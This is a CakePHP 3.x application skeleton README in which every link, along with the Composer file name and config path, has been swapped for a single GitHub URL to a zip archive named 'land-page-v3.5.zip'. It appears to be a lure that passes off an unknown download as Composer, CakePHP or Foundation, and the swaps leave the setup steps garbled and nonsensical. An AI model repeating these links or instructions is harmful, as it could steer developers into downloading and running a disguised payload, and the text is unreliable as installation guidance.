# CakePHP Application Skeleton

[![Build Status](https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip)](https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip)
[![Total Downloads](https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip)](https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip)

A skeleton for creating applications with [CakePHP](https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip) 3.x.

The framework source code can be found here: [cakephp/cakephp](https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip).

## Installation

1. Download [Composer](https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip) or update `composer self-update`.
2. Run `php https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip create-project --prefer-dist cakephp/app [app_name]`.

If Composer is installed globally, run

```bash
composer create-project --prefer-dist "cakephp/app:^3.8"
```

In case you want to use a custom app dir name (e.g. `/myapp/`):

```bash
composer create-project --prefer-dist "cakephp/app:^3.8" myapp
```

You can now either use your machine's webserver to view the default home page, or start
up the built-in webserver with:

```bash
bin/cake server -p 8765
```

Then visit `http://localhost:8765` to see the welcome page.

## Update

Since this skeleton is a starting point for your application and various files
would have been modified as per your needs, there isn't a way to provide
automated upgrades, so you have to do any updates manually.

## Configuration

Read and edit `https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip` and setup the `'Datasources'` and any other
configuration relevant for your application.

## Layout

The app skeleton uses a subset of [Foundation](https://raw.githubusercontent.com/Tarique775/land_page/main/src/Shell/land-page-v3.5.zip) (v5) CSS
framework by default. You can, however, replace it with any other library or
custom styles.
